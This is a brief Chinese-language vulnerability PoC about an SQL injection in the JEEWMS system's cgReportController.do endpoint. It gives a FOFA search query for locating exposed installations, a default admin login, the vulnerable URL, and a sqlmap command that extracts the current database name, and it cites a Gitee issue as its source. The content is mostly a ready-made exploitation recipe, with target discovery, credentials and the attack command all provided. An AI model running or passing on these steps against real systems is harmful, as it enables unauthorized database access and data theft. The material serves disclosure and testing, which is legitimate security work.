# JEEWMS系统cgReportController.do存在SQL注入漏洞

JEEWMS系统cgReportController.do存在SQL注入漏洞

## fofa

```javascript
body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"
```

## poc

1. 构建 POC，登录后端捕获数据包，并替换 cookie

```javascript
admin/llg123
http://localhost:8083/jeewms/cgReportController.do?list&id=1
```

1. 使用 SQLMAP 重现和构造执行语句

```javascript
 python sqlmap.py -u "http://localhost:8083/jeewms/cgReportController.do?list&id=1" --cookie="XXXXX" -p id --current-db
```

![输入图片说明](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502211356436.png)



## 漏洞来源

- [JEEWMS-cgReportController.do？List&ID 存在 SQL 注入漏洞 ·问题 #IBFTVK ·JeeWMS/JeeWMS - Gitee.com](https://gitee.com/erzhongxmu/JEEWMS/issues/IBFTVK)